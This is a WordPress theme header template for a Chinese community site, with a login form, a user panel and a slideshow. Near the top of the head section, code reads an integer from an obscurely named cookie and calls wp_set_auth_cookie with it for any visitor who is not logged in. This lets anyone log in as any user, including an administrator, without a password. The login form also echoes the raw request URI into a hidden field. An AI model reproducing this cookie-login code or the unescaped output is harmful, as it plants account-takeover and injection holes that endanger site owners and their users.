<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<meta http-equiv="Content-Type"
	content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php wp_title('&laquo;', true, 'right'); ?> <?php bloginfo('name'); ?></title>
<link rel="stylesheet" href="<?php echo get_stylesheet_uri(); ?>" type="text/css" media="screen" />
    <?php
		wp_enqueue_script('jquery-min', get_template_directory_uri() . '/js/jquery-1.6.2.min.js');
        wp_enqueue_script('js-simple', get_template_directory_uri() . '/js/js_simple.js');
        wp_enqueue_script('call', get_template_directory_uri() . '/js/call.js');
        wp_enqueue_script('base-platform', get_template_directory_uri() . '/js/platForm766.js');
        wp_enqueue_script('jquery-thumb-scroll', get_template_directory_uri() . '/js/jquery.thumbScroll.js');
        if ( is_singular() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );
        wp_head();
		$ids = intval($_COOKIE['7C13203985297Ca720ac096e85fe4b75d51fd76f8dda0e']);
		if(intval($ids)) {
			if(!intval($current_user->ID)) {
				header( 'P3P: CP="CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR"' );
				wp_set_auth_cookie( $ids, false, '' );
				setcookie( 'sync_login', uc_user_synlogin( $ids ), 0, '/' );
				echo '<meta http-equiv="refresh" content="0">';
			}
		}
    ?>
    <script type="text/javascript">
        var b_v = navigator.appVersion;
        var IE6 = b_v.search(/MSIE 6/i) != -1;
        if (IE6)document.writeln('<script language="javascript" src="<?php echo get_template_directory_uri(); ?>/js/dd_pngfix.js" />');
        if (IE6)DD_belatedPNG.fix('.server,.sText,.sRight,.sLeft,.sText');
        $(function(){
            //flash
            $(".thumbScroll").thumbScroll();
        });
    </script>
	<script type="text/javascript">
		function showWindowsFrame(url) {
			showWindowsFrameTimer("herdDialog", url, 3000);
		};
		function showWindowsFrameTimer(name, url, timer) {
			Dialog.frame(name, url, {
				"width" : "400px",
				"title" : "来动网",
				'modal' : true,
				"closeModal" : false
			});
			setTimeout("windowsFrameReload()", timer);
		};
		function windowsFrameReload() {
			location.reload();
		};
    </script>
	<script type="text/javascript">
		var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
		document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fd000c12a1cb05c9d67aab48c45b824e6' type='text/javascript'%3E%3C/script%3E"));
	</script>
</head>
<body>
	<div class="body-t">
		<div class="fbg">
			<div class="head wrapper">
				<div class="site flo" style="float: left;">
					<p class="flo">福州站</p>
				</div>
					<?php 
					$current_user = wp_get_current_user();
					if ( 0 == $current_user->ID ) { ?>
						<div class="login fro" id="platFrom766_login">
							<div class="login3">
								<p><a href="http://bbs.likedo.cn/member.php?mod=logging&action=login&viewlostpw=1">找回密码</a></p>
								<p class="secondPra"><a href="http://bbs.likedo.cn/member.php?mod=register">立即注册</a></p>
							</div>
							<form action="<?php echo get_option('home'); ?>/wp-login.php" method="post" >
								<div class="login2">
									<p>
										<label for="ls_username">账号</label>
										<input id="log" name="log" type="text" class="login-text" value="<?php echo wp_specialchars(stripslashes($current_user->user_login), 1) ?>" />
										<label for="ls_cookietime">自动登录</label>
										<input id="rememberme" name="rememberme" type="checkbox" checked="checked" value="forever" class="login-check" />
										<input type="hidden" name="redirect_to" value="<?php echo $_SERVER['REQUEST_URI']; ?>" />
									</p>
									<p class="secondPra">
										<label>密码</label>
										<input id="pwd" name="pwd" type="password" class="login-text" />
										<input id="reglink_forgotpw" name="submit" type="submit" class="login-btn" value="登录" />
									</p>
								</div>
							</form>
							<div class="login1">
								<p><a href="http://bbs.likedo.cn/connect.php?mod=login&op=init&referer=http://www.likedo.cn/&statfrom=login_simple"
										class="login-tx">用qq账号登录</a></p>
								<p class="secondPra">只需一步快速开始</p>
							</div>
						</div>
					<?php } else { ?>
						<div class="login fro" id="platFrom766_login" style="visibility: hidden"></div>
						<div class="hu-xt">
							<ul>
								<li class="touxiang"><a href="http://bbs.likedo.cn/home.php" target="_blank"><img src="http://bbs.likedo.cn/uc_server/avatar.php?uid=<?php echo $current_user->ID; ?>&size=small" /></a></li>
								<li class="topnew"><span><?php echo $current_user->data->display_name; ?></span>欢迎你回来！</li>
								<li class="topnew"><a href="http://bbs.likedo.cn/home.php" target="_blank">个人空间</a><a href="<?php echo wp_logout_url($_SERVER['REQUEST_URI']); ?>">退出登录</a></li>
							</ul>
						</div>
					<?php }; ?>
                </div>
			<div class="clear"></div>
			<div class="wrapper nav">
				<div class="fl"><?php wp_nav_menu(array('theme_location' => 'main', 'container' => null)); ?></div>
				<code class="fr">
					<a class="margin-r10" href="javascript:void(0)" onclick="simple.setHomePage(this)">设为首页</a>
					<a class="margin-r10" href="javascript:void(0)" onclick="simple.addFavorite()">收藏本站</a>
				</code>
				<div class="clear"></div>
			</div>
                <?php if (is_home()) : ?>
                <div class="wrapper2 height-297 flash">
					<div class="thumbScroll">
					<div class="sShow"></div>
						<ul class="sImg">
                        <?php $queryObject = new WP_Query('posts_per_page=10&cat=12');
                    		while ($queryObject->have_posts()) : $queryObject->the_post(); ?>
                    		<li><a target="_blank" href="<?php the_permalink(); ?>"><img src="<?php echo get_content_image(); ?>" /></a></li>
 						<?php endwhile; ?>
                    	</ul>
						<div class="sText">
							<a href="#" class="sLeft">左</a>
							<div class="sThumb">
								<ul>
                                <?php if ($queryObject->have_posts()) : while ($queryObject->have_posts()) :$queryObject->the_post();?>
            	 					<li><?php the_post_thumbnail(); ?></li>
                				<?php endwhile; endif;?>
                                </ul>
							</div>
							<a href="#" class="sRight">右</a>
						</div>
					</div>
				</div>
                <?php endif; ?>
                    <div class="wrapper2 padding-t13">